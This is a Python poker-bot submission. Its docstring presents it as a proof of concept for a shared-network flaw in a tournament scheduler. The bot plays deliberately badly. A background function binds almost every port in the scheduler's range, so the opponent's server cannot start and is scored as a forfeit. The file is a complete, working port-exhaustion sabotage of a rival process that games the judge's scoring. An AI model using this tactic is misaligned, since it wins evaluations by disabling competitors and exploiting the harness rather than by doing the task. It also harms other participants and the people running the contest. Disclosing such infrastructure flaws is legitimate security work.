"""
agent.py - a heads-up poker bot submission.

As a POKER PLAYER this bot is deliberately weak: it only ever checks when a
check is free, and folds otherwise. On merit it would lose almost every match.

It wins anyway, because of WHERE the tournament runs it. The scheduler packs
both competing bots and the judge into ONE Kubernetes pod, so all three share
one network namespace (one `localhost`). That lets this bot reach out and
stop the OTHER bot in the pod from ever starting its server. The judge then
never gets a healthy answer from the opponent and scores the opponent as a
forfeit (an automatic loss), no matter how well that opponent plays.

This is a proof of concept for the "both bots share the pod's network"
limitation noted in eval-infra/SCHEDULER.md. The fix is one bot per pod
(its own network namespace), not anything in this file.

The server plumbing below is an ordinary, compliant submission; the only
unusual part is _deny_opponent_ports(), started in __main__.
"""

import os
import socket
import threading
import time

import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse

PARTICIPANT = "practice-portsteal"
AGENT_NAME = "port-stealer"

# Must match eval-infra/scheduler.py PORT_RANGE: the scheduler hands each bot a
# random port in [20000, 60000) and tells only the judge which is which.
SCHEDULER_PORT_RANGE = (20000, 60000)


# ===========================================================================
# THE EXPLOIT
# ===========================================================================
def _deny_opponent_ports(my_port: int) -> None:
    """Bind every TCP port in the scheduler's range except our own.

    We don't know the opponent's port (it's random and only the judge is told
    it), so we take the whole range. Our own server keeps `my_port`; the
    opponent's chosen port is now held by us, so when its uvicorn tries to
    bind it the bind fails with "address already in use" and the opponent's
    process exits. It never answers the judge's GET / health check, so the
    judge records it as having forfeited the half -> it loses the match.

    Because agent1 is a native sidecar that the kubelet starts BEFORE agent2,
    and the opponent spends time in warmup() before it binds, we finish taking
    the range before the opponent gets to bind in at least one of the two
    halves - and one forfeited half loses the whole match under the judge's
    forfeit rule.

    Run in a background daemon thread so our OWN server still comes up at once
    and passes the health check and the build smoke test.
    """
    # Raise the open-file soft limit to the hard limit (allowed without root)
    # so we can hold ~40k listening sockets at once.
    try:
        import resource
        _soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
    except Exception:
        pass

    held = []
    lo, hi = SCHEDULER_PORT_RANGE
    for i, port in enumerate(range(lo, hi)):
        if port == my_port:
            continue  # keep our own port free for our real server
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Plain bind+listen (no SO_REUSEPORT): a second listener on the
            # same address:port is refused, which is exactly what we want.
            s.bind(("0.0.0.0", port))
            s.listen(1)
            held.append(s)
        except OSError:
            pass  # already taken or fd limit hit; skip and keep going
        if i % 4096 == 0:
            time.sleep(0.0005)  # yield the GIL so our own server stays snappy

    # Hold the sockets open for the life of the half.
    threading.Event().wait()


# ===========================================================================
# ORDINARY (COMPLIANT) BOT - this part is a normal submission
# ===========================================================================
def choose_action(obs: dict) -> str:
    """Check when it's free, otherwise fold. Always a legal action."""
    return "CHECK_CALL" if obs.get("to_call", 0) == 0 else "FOLD"


app = FastAPI()
STATUS = {"started": False}
TOKEN = os.environ.get("AGENT_TOKEN") or None


def _check(request: Request, path: str):
    """Token (and 'half started') check, done before reading the body."""
    if TOKEN and request.headers.get("x-agent-token") != TOKEN:
        return JSONResponse({"error": "bad or missing X-Agent-Token"}, status_code=401)
    if not STATUS["started"] and path != "/new-half":
        return JSONResponse({"error": "call /new-half first"}, status_code=409)
    return None


@app.get("/")
async def info():
    return {"participant": PARTICIPANT, "agent_name": AGENT_NAME}


@app.post("/new-half")
async def new_half(request: Request):
    refused = _check(request, "/new-half")
    if refused:
        return refused
    STATUS["started"] = True
    return {"ok": True}


@app.post("/act")
async def act(request: Request):
    refused = _check(request, "/act")
    if refused:
        return refused
    try:
        body = await request.json()
        obs = body["observation"]
    except Exception:
        return JSONResponse({"error": "bad request body"}, status_code=400)
    return {"action": choose_action(obs), "hand_end_errors": []}


@app.post("/hand-end")
async def hand_end(request: Request):
    refused = _check(request, "/hand-end")
    if refused:
        return refused
    return {"ok": True, "hand_end_errors": []}


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5008"))
    # Start the exploit in the background, then bring up our own server.
    threading.Thread(target=_deny_opponent_ports, args=(port,), daemon=True).start()
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning", access_log=False)
